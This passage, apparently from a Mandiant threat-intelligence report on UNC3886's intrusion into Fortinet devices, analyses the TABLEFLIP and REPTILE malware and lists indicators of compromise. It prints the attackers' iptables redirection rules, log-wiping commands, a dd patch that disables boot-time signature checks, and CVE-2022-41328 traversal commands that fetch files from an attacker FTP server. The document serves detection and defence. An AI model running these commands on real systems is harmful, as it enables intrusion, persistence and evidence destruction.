style\u003d\"color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center\"\u003eFigure 17: TABLEFLIP payload structure\u003c/div\u003e\n\u003c/div\u003e\n\u003cp\u003eThe malware then attempted to extract the command, IP, and port from the payload. Table 6 describes the command and actions taken when a command was recognized.\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\u003ctable\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e\u003cstrong\u003eCommand\u003c/strong\u003e\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e\u003cstrong\u003eDescription\u003c/strong\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e0xFFFEFDFC\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003eEnable redirection for traffic with source IP matching extracted IP and port 541 to extracted destination port\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e0xFCFDFEFF\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003eDisable redirection for traffic with source IP matching extracted IP and specified destination port\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003cdiv style\u003d\"color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center\"\u003eTable 6: TABLEFLIP capabilities key\u003c/div\u003e\n\u003cp\u003eTraffic redirection was accomplished by adding \u003ccode\u003eiptables\u003c/code\u003e rules on the FortiManager system as seen in Figure 18. with the source IP and redirection port specified in the command packet. \u003ccode\u003eiptables\u003c/code\u003e was executed to check if a PREROUTING rule for that IP and port combination already existed. If the combination was not found, a new redirection rule was added in the PREROUTING chain. The rules under the PREROUTING chain were processed immediately once the packet is received on an interface.\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eiptables -t nat -S PREROUTING | grep \u0026lt;src_ip\u0026gt; | grep \u0026lt;redirection_port\u0026gt; || iptables -t nat -A PREROUTING -p tcp -s \u0026lt;src_ip\u0026gt; --dport 541 -j REDIRECT --to-port \u0026lt;redirection_port\u0026gt;\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center\"\u003eFigure 18: iptables rule to implement traffic redirection\u003c/div\u003e\n\u003c/div\u003e\n\u003cp\u003eWhen assigned to delete traffic redirection, TABLEFLIP utilized the \u003ccode\u003egrep\u003c/code\u003e command to filter on all lines in the PREROUTING chain which contained the IP address and redirection port of interest, capturing the appropriate rule id’s with \u003ccode\u003eawk\u003c/code\u003e. These id’s were passed back to \u003ccode\u003eiptables\u003c/code\u003e with \u003ccode\u003exargs\u003c/code\u003e to have them removed from the PREROUTING chain, as seen in Figure 19.\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eiptables -t nat -S PREROUTING | tail -n +2 | grep -n -E \u0026#39;\u0026lt;src_ip\u0026gt;.*\u0026lt; \r\nredirection_port\u0026gt;\u0026#39; | awk -F: \u0026#39;{print $1}\u0026#39;| xargs iptables -t nat -D PREROUTING\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center\"\u003eFigure 19: iptables rule to disable traffic redirection\u003c/div\u003e\n\u003c/div\u003e\n\u003ch3\u003eREPTILE (Backdoor)\u003c/h3\u003e\n\u003cp\u003eTo achieve persistent access on the FortiManager device, the threat actor deployed a backdoor with the filename \u003ccode\u003e/bin/klogd\u003c/code\u003e (MD5: \u003ccode\u003e53a69adac914808eced2bf8155a7512d\u003c/code\u003e) that Mandiant refers to as REPTILE, a variant of a publicly available Linux kernel module (LKM) rootkit. With the assistance of TABLEFLIP, the threat actor was able to successfully forward traffic and access the REPTILE backdoor using \u003ccode\u003eiptables\u003c/code\u003e traffic redirection rules.\u003c/p\u003e\n\u003cp\u003eOnce executed, REPTILE created a packet socket to receive OSI layer 2 packets. When a packet was received, the backdoor would perform the check seen in the pseudocode in Figure 20 to determine if a magic string was present.\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003esingle_byte_xor_key \u003d (month * year) * day % 255\r\nindex \u003d 2 * data_received_on_port_8[7];\r\ndata_to_decode_ptr \u003d *((char *)\u0026amp;data[index + 12] + 1)\r\ni \u003d 0\r\nwhile ( i \u0026lt; strlen(data_to_decode) )\r\n    decoded_data[i] \u003d data_to_decode_ptr[i++] ^ single_byte_xor_key;\r\nstrncmp(\u0026amp;decoded_data, \u0026quot;mznCvqSBo\u0026quot;, 9)\u003c/code\u003e\u003c/pre\u003e\n\u003cp style\u003d\"text-align:center\"\u003e\u003cspan style\u003d\"color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%\"\u003eFigure 20: REPTILE magic string detection pseudocode\u003c/span\u003e\u003c/p\u003e\n\u003cp style\u003d\"text-align:left\"\u003eTable 7 shows the magic strings interpreted by REPTILE and their resultant actions.\u003c/p\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\u003ctable border\u003d\"1\" style\u003d\"border-collapse:collapse;width:100%\"\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd style\u003d\"width:17.1123%\"\u003e\n\u003cp\u003e\u003cstrong\u003eMagic String\u003c/strong\u003e\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"width:82.8877%\"\u003e\n\u003cp\u003e\u003cstrong\u003eDescription\u003c/strong\u003e\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd style\u003d\"width:17.1123%\"\u003e\n\u003cp\u003e\u003cem\u003emznCvqSBo\u003c/em\u003e\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"width:82.8877%\"\u003e\n\u003cp\u003eParse C2 information from OSI layer 2 packet and connects to it over SSL.\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd style\u003d\"width:17.1123%\"\u003e\n\u003cp\u003ehpaVAj2FJ\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"width:82.8877%\"\u003e\n\u003cp\u003eKills REPTILE process (Only searched for if first magic string not found)\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003cp style\u003d\"text-align:center\"\u003e\u003cspan style\u003d\"color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%\"\u003eTable 7: REPTILE magic string options\u003c/span\u003e\u003c/p\u003e\n\u003cp style\u003d\"text-align:left\"\u003eSimilar to the method used by CASTLETAP to decode the C2 information, REPTILE derived a single-byte XOR key from the Epoch date stamp to decrypt payload data, which caused the encryption key to change daily. Figure 21 shows the formula that was used to calculate the XOR key.\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e\u003cstrong\u003e(month * (year + 1900)) * day % 255\u003c/strong\u003e\u003c/code\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e\u003cstrong\u003eyear: index starting from 1900 i.e. current_year-1900\u003c/strong\u003e\u003c/code\u003e \u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e\u003cstrong\u003emonth: index starting from 0\u003c/strong\u003e\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e\u003cstrong\u003edate: index starting from 1\u003c/strong\u003e\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp style\u003d\"text-align:center\"\u003e\u003cspan style\u003d\"color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%\"\u003eFigure 21: REPTILE XOR key calculation\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003eIf the magic string “\u003ccode\u003emznCvqSBo\u003c/code\u003e” was found, a reverse shell was created with the C2 IP address and destination port extracted from the rest of the activation packet payload. When the first magic string was not present, the binary searched for the second magic string “\u003ccode\u003ehpaVAj2FJ\u003c/code\u003e”. If this second magic string was found, the REPTILE process will end.If no magic strings were found, the backdoor continued to listen for other connections.\u003c/p\u003e\n\u003ch2\u003eThreat Actor Anti-Forensics\u003c/h2\u003e\n\u003ch3\u003eClearing and Modifying Logs\u003c/h3\u003e\n\u003cp\u003eMandiant analyzed the system memory of the FortiManager and identified threat actor commands used to clear specific events that contained the threat actor’s IP address from multiple log sources. The commands seen in Figure 22 were utilized by the threat actor to remove log entries containing the IP address used to connect to the THINCRUST backdoor.\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eecho \u0026gt; /var/log/django.log; \\\r\necho \u0026gt; /var/log/apache2/error_log; \\\r\nsed -i ‘/\u0026lt;ipaddress\u0026gt;/d’ /var/log/apache2/*log; \\\r\nls -alt /var/log/ /var/log/apache2/\u003c/code\u003e\u003c/pre\u003e\n\u003cp style\u003d\"text-align:center\"\u003e\u003cspan style\u003d\"color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%\"\u003eFigure 22: Threat actor’s anti-forensics commands\u003c/span\u003e\u003c/p\u003e\n\u003ch3\u003eDisabling File System Verification on Startup\u003c/h3\u003e\n\u003cp\u003eIn an attempt to skip digital signature verification checks made to the file system on boot, the threat actor added the command seen in Figure 23 to the startup config \u003ccode\u003e/etc/init.d/localnet\u003c/code\u003e within the \u003ccode\u003erootfs.gz\u003c/code\u003e archive of both FortiManager and FortiAnalyzer devices.\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eprintf \u0026quot;t\u0026quot; | dd of\u003d/bin/smit bs\u003d1 count\u003d1 conv\u003dnotrunc seek\u003d22866 2\u0026gt;/dev/null\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp style\u003d\"text-align:center\"\u003e\u003cspan style\u003d\"color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%\"\u003eFigure 23: /etc/init.d/localnet – DD Command\u003c/span\u003e\u003c/p\u003e\n\u003cp style\u003d\"text-align:left\"\u003eComparing the compromised \u003ccode\u003e/bin/smit\u003c/code\u003e (\u003ccode\u003ea388ebaef45add5da503e4bf2b9da546\u003c/code\u003e) with a clean version from both FortiManager and FortiAnalyzer, the modified binary contained a single byte difference. The modified location within \u003ccode\u003e/bin/smit\u003c/code\u003e is executed when the \u003ccode\u003emount\u003c/code\u003e command line argument is given on system startup. Normally, the \u003ccode\u003emount\u003c/code\u003e function would perform OpenSSL 1.1.0 digital signature verification checks on the files in Figure 24 against \u003ccode\u003e/data/.fmg_sign\u003c/code\u003e, but this modification changed a conditional jump instruction to an unconditional jump instruction which always skipped digital signature verification checks normally made on the system files.\u003c/p\u003e\n\u003cp style\u003d\"text-align:left\"\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e/data/extlinux.sys\r\n/data/extlinux.conf\r\n/data/boot.msg\r\n/data/vmlinuz\r\n/data/rootfse-fe\u003c/code\u003e\u003c/pre\u003e\n\u003cp style\u003d\"text-align:center\"\u003e\u003cspan style\u003d\"color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%\"\u003eFigure 24: Files normally checked by /bin/smit\u003c/span\u003e\u003c/p\u003e\n\u003cp\u003eSince the \u003ccode\u003emount\u003c/code\u003e command executes prior to \u003ccode\u003e/etc/init.d/localnet\u003c/code\u003e on system startup, the \u003ccode\u003edd\u003c/code\u003e command will overwrite the 22,866\u003csup\u003eth\u003c/sup\u003e byte of \u003ccode\u003e/bin/smit\u003c/code\u003e with the character “\u003ccode\u003et\u003c/code\u003e”, reverting the binary to a state that appears as if it was never tampered with, even if the file was hashed.\u003c/p\u003e\n\u003ch2\u003eAttribution\u003c/h2\u003e\n\u003cp\u003eUNC3886 is an advanced cyber espionage group with unique capabilities in how they operate on-network as well as the tools they utilize in their campaigns. UNC3886 has been observed targeting firewall and virtualization technologies which lack EDR support. Their ability to manipulate firewall firmware and exploit a zero-day indicates they have curated a deeper-level of understanding of such technologies. UNC3886 has modified publicly available malware, specifically targeting *nix operating systems.\u003c/p\u003e\n\u003cp\u003eAnother threat cluster unrelated to UNC3886, suspected to be from China has recently been observed targeting zero-day vulnerabilities in Fortinet as reported by Mandiant in mid-January of 2023. Mandiant continues to gather evidence and identify overlaps between UNC3886 and other groups that are attributed to Chinese APT.\u003c/p\u003e\n\u003ch2\u003eConclusion\u003c/h2\u003e\n\u003cp\u003eThe activity discussed in this blog post is further evidence that advanced cyber espionage threat actors are taking advantage of any technology available to persist and traverse a target environment, especially those technologies that do not support EDR solutions. This presents a unique challenge for investigators as many network appliances lack solutions to detect runtime modifications made to the underlying operating system and require direct involvement of the manufacturer to collect forensic images. Cross organizational communication and collaboration is key to providing both manufacturers with early notice of new attack methods in the wild before they are made public and investigators with expertise to better shed light on these new attacks.\u003c/p\u003e\n\u003cp\u003eMandiant recommends organizations using the ESXi and the VMware infrastructure suite follow the hardening steps outlined in this blog post to \u003ca href\u003d\"https://cloud.google.com/blog/topics/threat-intelligence/esxi-hypervisors-detection-hardening\" rel\u003d\"noopener\" target\u003d\"_blank\" title\u003d\"https://www.mandiant.com/resources/blog/esxi-hypervisors-detection-hardening\"\u003eminimize the attack surface of ESXi hosts\u003c/a\u003e.\u003c/p\u003e\n\u003ch2\u003eAcknowledgements\u003c/h2\u003e\n\u003cp\u003eSpecial thanks to Jeremy Koppen, Kirstie Failey, Bryce Bucklin, Jay Smith, Nicholas Luedtke, Ronnie Salomonsen, Nino Isakovic, Charles Carmakal, and Fortinet PSIRT for their assistance with the investigation, technical review, and creating detections for the malware families discussed in this blog post. In addition, we would also like to thank Fortinet and VMware for their collaboration on this research.\u003c/p\u003e\n\u003cp\u003eFortinet released two additional resources covering \u003ca href\u003d\"https://www.fortiguard.com/psirt/FG-IR-22-369\" rel\u003d\"noreferrer noopener\" target\u003d\"_blank\" title\u003d\"https://www.fortiguard.com/psirt/fg-ir-22-369\"\u003eCVE-2022-41328\u003c/a\u003e and an \u003ca href\u003d\"https://www.fortinet.com/blog/psirt-blogs/fg-ir-22-369-psirt-analysis\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eanalysis of identified attacker activity\u003c/a\u003e.\u003c/p\u003e\n\u003ch2\u003eMITRE ATT\u0026amp;CK Techniques\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eImpact\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e   T1565.001: Stored Data Manipulation\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eDefense Evasion\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e   T1027:        Obfuscated Files or Information\u003c/li\u003e\n\u003cli\u003e   T1070:        Indicator Removal\u003c/li\u003e\n\u003cli\u003e   T1070.003:    Clear Command History\u003c/li\u003e\n\u003cli\u003e   T1070.004:    File Deletion\u003c/li\u003e\n\u003cli\u003e   T1078:        Valid Accounts\u003c/li\u003e\n\u003cli\u003e   T1140:        Deobfuscate/Decode Files or Information\u003c/li\u003e\n\u003cli\u003e   T1202:        Indirect Command Execution\u003c/li\u003e\n\u003cli\u003e   T1218.011:    Rundll32\u003c/li\u003e\n\u003cli\u003e   T1222:        File and Directory Permissions Modification\u003c/li\u003e\n\u003cli\u003e   T1497:        Virtualization/Sandbox Evasion\u003c/li\u003e\n\u003cli\u003e   T1497.001:    System Checks\u003c/li\u003e\n\u003cli\u003e   T1620:        Reflective Code Loading\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eCredential Access\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e   T1552:        Unsecured Credentials\u003c/li\u003e\n\u003cli\u003e   T1555.005:    Password Managers\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e \u003cstrong\u003eDiscovery\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e   T1016:        System Network Configuration Discovery\u003c/li\u003e\n\u003cli\u003e   T1033:        System Owner/User Discovery\u003c/li\u003e\n\u003cli\u003e   T1057:        Process Discovery\u003c/li\u003e\n\u003cli\u003e   T1082:        System Information Discovery\u003c/li\u003e\n\u003cli\u003e   T1083:        File and Directory Discovery\u003c/li\u003e\n\u003cli\u003e   T1087:        Account Discovery\u003c/li\u003e\n\u003cli\u003e   T1518:        Software Discovery\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e \u003cstrong\u003eCollection\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e   T1074.001:    Local Data Staging\u003c/li\u003e\n\u003cli\u003e   T1560:        Archive Collected Data\u003c/li\u003e\n\u003cli\u003e   T1560.001:    Archive via Utility\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eExecution\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e   T1059:        Command and Scripting Interpreter\u003c/li\u003e\n\u003cli\u003e   T1059.001:    PowerShell\u003c/li\u003e\n\u003cli\u003e   T1059.003:    Windows Command Shell\u003c/li\u003e\n\u003cli\u003e   T1059.004:    Unix Shell\u003c/li\u003e\n\u003cli\u003e   T1059.006:    Python\u003c/li\u003e\n\u003cli\u003e   T1129:        Shared Modules\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eCommand and Control\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e   T1095:        Non-Application Layer Protocol\u003c/li\u003e\n\u003cli\u003e   T1102.001:    Dead Drop Resolver\u003c/li\u003e\n\u003cli\u003e   T1105:        Ingress Tool Transfer\u003c/li\u003e\n\u003cli\u003e   T1571:        Non-Standard Port\u003c/li\u003e\n\u003cli\u003e   T1573.001:    Symmetric Cryptography\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eLateral Movement\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e   T1021.004:    SSH\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2\u003eIndicators of Compromise\u003c/h2\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\u003ctable border\u003d\"1\" style\u003d\"border-collapse:collapse;width:135.381%;height:2950.08px\"\u003e\n\u003ctbody\u003e\n\u003ctr style\u003d\"height:54.3958px\"\u003e\n\u003ctd colspan\u003d\"2\" style\u003d\"border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px\"\u003e\n\u003cp\u003e\u003cstrong\u003eType\u003c/strong\u003e\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px\"\u003e\n\u003cp\u003e\u003cstrong\u003eValues\u003c/strong\u003e\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px\"\u003e\n\u003cp\u003e\u003cstrong\u003eDescription\u003c/strong\u003e\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr style\u003d\"height:166.375px\"\u003e\n\u003ctd colspan\u003d\"2\" style\u003d\"border:1px solid #000000;padding:16px;width:10.581%;height:166.375px\"\u003e\n\u003cp\u003eFortiGate Command\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:57.0582%;height:166.375px\"\u003e\n\u003cp\u003eexecute wireless-controller hs20-icon upload-icon ftp ../../../../../../bin/lspci \u0026lt;TA FTP Server\u0026gt;\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:32.3791%;height:166.375px\"\u003e\n\u003cp\u003eAttempted execution of this command or similar commands containing directory traversal are indicative of attempted exploitation of CVE-2022-41328 to upload a file to a normally restricted directory\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr style\u003d\"height:166.375px\"\u003e\n\u003ctd colspan\u003d\"2\" style\u003d\"border:1px solid #000000;padding:16px;width:10.581%;height:166.375px\"\u003e\n\u003cp\u003eFortiGate Command\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:57.0582%;height:166.375px\"\u003e\n\u003cp\u003eexecute wireless-controller hs20-icon upload-icon tftp ../../../../../../bin/lspci \u0026lt;TA TFTP Server\u0026gt;\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:32.3791%;height:166.375px\"\u003e\n\u003cp\u003eAttempted execution of this command or similar commands containing directory traversal are indicative of attempted exploitation of CVE-2022-41328 to upload a file to a normally restricted directory\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr style\u003d\"height:76.7917px\"\u003e\n\u003ctd colspan\u003d\"2\" style\u003d\"border:1px solid #000000;padding:16px;width:10.581%;height:76.7917px\"\u003e\n\u003cp\u003eFilename\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:57.0582%;height:76.7917px\"\u003e\n\u003cp\u003e/bin/fgfm\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:32.3791%;height:76.7917px\"\u003e\n\u003cp\u003eCASTLETAP Sample found on a FortiGate device\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr style\u003d\"height:121.583px\"\u003e\n\u003ctd colspan\u003d\"2\" style\u003d\"border:1px solid #000000;padding:16px;width:10.581%;height:121.583px\"\u003e\n\u003cp\u003eSymlinked File\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:57.0582%;height:121.583px\"\u003e\n\u003cp\u003e/bin/lspci -\u0026gt; /bin/sysctl\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:32.3791%;height:121.583px\"\u003e\n\u003cp\u003elspci should be a standalone binary within FortiGate devices. A symlink suggests that a modification was made to the file system\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr style\u003d\"height:99.1875px\"\u003e\n\u003ctd colspan\u003d\"2\" style\u003d\"border:1px solid 